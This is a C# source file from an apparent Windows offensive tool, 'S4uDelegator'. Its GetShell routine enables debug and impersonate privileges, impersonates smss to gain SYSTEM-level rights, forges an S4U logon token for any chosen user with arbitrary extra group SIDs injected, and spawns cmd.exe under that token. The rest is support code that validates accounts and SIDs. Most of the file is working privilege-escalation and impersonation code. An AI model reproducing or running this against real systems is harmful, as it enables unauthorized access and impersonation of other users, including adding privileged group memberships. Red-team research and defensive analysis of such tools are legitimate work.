using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text.RegularExpressions;
using S4uDelegator.Interop;

namespace S4uDelegator.Library
{
    internal class Modules
    {
        public static bool GetShell(
            string domain,
            string username,
            string sid,
            string[] extraSids)
        {
            var groupSids = new string[] { };

            if (string.IsNullOrEmpty(domain))
                domain = Environment.MachineName;

            Console.WriteLine();

            if (!VerifyAccount(
                ref domain,
                ref username,
                ref sid,
                out string upn))
            {
                return false;
            }

            if (extraSids.Length > 0)
                groupSids = VerifyGroupSids(extraSids);

            Console.WriteLine("[>] Trying to get SYSTEM.");

            IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
            var privs = new string[] {
                Win32Consts.SE_DEBUG_NAME,
                Win32Consts.SE_IMPERSONATE_NAME
            };

            if (!Utilities.EnableMultiplePrivileges(hCurrentToken, privs))
                return false;

            privs = new string[] {
                Win32Consts.SE_TCB_NAME,
                Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME
            };

            if (!Utilities.ImpersonateAsSmss(privs))
                return false;

            int error;
            bool status;
            IntPtr hImpersonationToken;
            IntPtr hPrimaryToken;

            if (string.IsNullOrEmpty(upn))
            {
                hPrimaryToken = Utilities.GetMsvS4uLogonToken(
                    username,
                    domain,
                    SECURITY_LOGON_TYPE.Network,
                    groupSids);
            }
            else
            {
                hImpersonationToken = Utilities.GetKerbS4uLogonToken(
                    username,
                    domain,
                    SECURITY_LOGON_TYPE.Network,
                    groupSids);

                if (hImpersonationToken == IntPtr.Zero)
                    return false;

                status = NativeMethods.DuplicateTokenEx(
                    hImpersonationToken,
                    TokenAccessFlags.TOKEN_ALL_ACCESS,
                    IntPtr.Zero,
                    SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous,
                    TOKEN_TYPE.TokenPrimary,
                    out hPrimaryToken);

                NativeMethods.CloseHandle(hImpersonationToken);

                if (!status)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to create primary token.");
                    Console.WriteLine("    |-> {0}\n", Helpers.GetWin32ErrorMessage(error, false));

                    return false;
                }
            }

            if (hPrimaryToken == IntPtr.Zero)
                return false;

            status = Utilities.CreateTokenAssignedProcess(
                hPrimaryToken,
                "C:\\Windows\\System32\\cmd.exe");

            NativeMethods.CloseHandle(hPrimaryToken);

            return status;
        }


        public static bool LookupSid(
            string domain,
            string username,
            string sid)
        {
            string result;
            string accountName;

            if ((!string.IsNullOrEmpty(domain) || !string.IsNullOrEmpty(username)) &&
                !string.IsNullOrEmpty(sid))
            {
                Console.WriteLine("\n[!] Username or domain name should not be specified with SID at a time.\n");

                return false;
            }
            else if (!string.IsNullOrEmpty(domain) || !string.IsNullOrEmpty(username))
            {
                if (!string.IsNullOrEmpty(domain) && domain.Trim() == ".")
                    domain = Environment.MachineName;

                if (!string.IsNullOrEmpty(domain) && !string.IsNullOrEmpty(username))
                    accountName = string.Format("{0}\\{1}", domain, username);
                else if (!string.IsNullOrEmpty(domain))
                    accountName = domain;
                else if (!string.IsNullOrEmpty(username))
                    accountName = username;
                else
                    return false;

                result = Helpers.ConvertAccountNameToSidString(
                    ref accountName,
                    out SID_NAME_USE peUse);

                if (!string.IsNullOrEmpty(result))
                {
                    Console.WriteLine();
                    Console.WriteLine("[*] Result:");
                    Console.WriteLine("    |-> Account Name : {0}", accountName);
                    Console.WriteLine("    |-> SID          : {0}", result);
                    Console.WriteLine("    |-> Account Type : {0}", peUse.ToString());
                    Console.WriteLine();

                    return true;
                }
                else
                {
                    Console.WriteLine("\n[*] No result.\n");

                    return false;
                }
            }
            else if (!string.IsNullOrEmpty(sid))
            {
                result = Helpers.ConvertSidStringToAccountName(
                    ref sid,
                    out SID_NAME_USE peUse);

                if (!string.IsNullOrEmpty(result))
                {
                    Console.WriteLine();
                    Console.WriteLine("[*] Result:");
                    Console.WriteLine("    |-> Account Name : {0}", result);
                    Console.WriteLine("    |-> SID          : {0}", sid);
                    Console.WriteLine("    |-> Account Type : {0}", peUse.ToString());
                    Console.WriteLine();

                    return true;
                }
                else
                {
                    Console.WriteLine("\n[*] No result.\n");

                    return false;
                }
            }
            else
            {
                Console.WriteLine("\n[!] SID, domain name or username to lookup is required.\n");

                return false;
            }
        }


        private static bool VerifyAccount(
            ref string domain,
            ref string username,
            ref string sid,
            out string upn)
        {
            string computerName = Environment.MachineName;
            string currentDomain = Helpers.GetCurrentDomain();
            string fqdn = currentDomain;
            string localSid = Helpers.ConvertAccountNameToSidString(
                ref computerName,
                out SID_NAME_USE peUse);
            string domainSid;
            string accountName;
            string accountSid;
            string patternDomainSid;
            string patternLocalSid = string.Format("^{0}(-\\d+)$", localSid);
            var rgx = new Regex(patternLocalSid);
            upn = null;

            if (domain == ".")
                domain = Environment.MachineName;

            if (string.IsNullOrEmpty(currentDomain))
            {
                domainSid = null;
                patternDomainSid = null;
            }
            else
            {
                domainSid = Helpers.ConvertAccountNameToSidString(
                    ref currentDomain,
                    out peUse);
                patternDomainSid = string.Format("^{0}(-\\d+)$", domainSid);
            }

            if ((!string.IsNullOrEmpty(domain) || !string.IsNullOrEmpty(username)) &&
                !string.IsNullOrEmpty(sid))
            {
                Console.WriteLine("[!] Account name and SID should not be specified at a time.\n");

                return false;
            }

            if (string.IsNullOrEmpty(sid))
            {
                if (!string.IsNullOrEmpty(domain) && !string.IsNullOrEmpty(username))
                    accountName = string.Format("{0}\\{1}", domain, username);
                else if (!string.IsNullOrEmpty(domain))
                    accountName = domain;
                else if (!string.IsNullOrEmpty(username))
                    accountName = username;
                else
                    return false;

                accountSid = Helpers.ConvertAccountNameToSidString(
                    ref accountName,
                    out peUse);
            }
            else
            {
                accountSid = sid;
                accountName = Helpers.ConvertSidStringToAccountName(
                    ref accountSid,
                    out peUse);
            }

            if (!string.IsNullOrEmpty(accountName) &&
                !string.IsNullOrEmpty(accountSid))
            {
                if (peUse != SID_NAME_USE.SidTypeUser)
                {
                    Console.WriteLine("[-] Target account should be user account.\n");

                    return false;
                }

                try
                {
                    domain = accountName.Split('\\')[0];
                    username = accountName.Split('\\')[1];
                }
                catch
                {
                    Console.WriteLine("[-] Failed to parse account name.\n");

                    return false;
                }

                Console.WriteLine("[>] Target account to S4U:");
                Console.WriteLine("    |-> Account Name        : {0}", accountName);
                Console.WriteLine("    |-> Account Sid         : {0}", accountSid);
                Console.WriteLine("    |-> Account Type        : {0}", peUse.ToString());

                if (rgx.IsMatch(accountSid))
                {
                    upn = null;
                }
                else if (!string.IsNullOrEmpty(domainSid))
                {
                    rgx = new Regex(patternDomainSid);

                    if (rgx.IsMatch(accountSid))
                    {
                        upn = string.Format("{0}@{1}", username, fqdn);
                    }
                    else
                    {
                        Console.WriteLine("[-] Target account cannot be used to S4U.\n");

                        return false;
                    }
                }
                else
                {
                    Console.WriteLine("[-] Target account cannot be used to S4U.\n");

                    return false;
                }

                Console.WriteLine("    |-> User Principal Name : {0}", string.IsNullOrEmpty(upn) ? "(NULL)" : upn);

                return true;
            }
            else
            {
                Console.WriteLine("[-] Failed to resolve target account information.\n");

                return false;
            }
        }


        private static string[] VerifyGroupSids(string[] groupSids)
        {
            var result = new List<string>();
            string accountName;
            var filter = new Regex(@"^(s|S)(-\d+)+$");

            if (groupSids.Length > 0)
            {
                Console.WriteLine("[>] Group SID to add:");

                for (var idx = 0; idx < groupSids.Length; idx++)
                {
                    if (!filter.IsMatch(groupSids[idx]))
                        continue;
                    else if (result.Contains(groupSids[idx].ToUpper()))
                        continue;

                    accountName = Helpers.ConvertSidStringToAccountName(
                        ref groupSids[idx],
                        out SID_NAME_USE peUse);

                    if (string.IsNullOrEmpty(accountName))
                    {
                        Console.WriteLine(
                            "    |-> [IGNORED] Failed to resolve {0}.",
                            groupSids[idx].ToUpper());
                    }
                    else if ((peUse == SID_NAME_USE.SidTypeGroup) ||
                        (peUse == SID_NAME_USE.SidTypeWellKnownGroup))
                    {
                        Console.WriteLine(
                            "    |-> [VALID] {0} (SID : {1}) will be added.",
                            accountName,
                            groupSids[idx].ToUpper());
                        result.Add(groupSids[idx].ToUpper());
                    }
                    else
                    {
                        Console.WriteLine(
                            "    |-> [IGNORED] {0} (SID : {1}) is not group.",
                            accountName,
                            groupSids[idx].ToUpper());
                    }
                }
            }

            return result.ToArray();
        }
    }
}
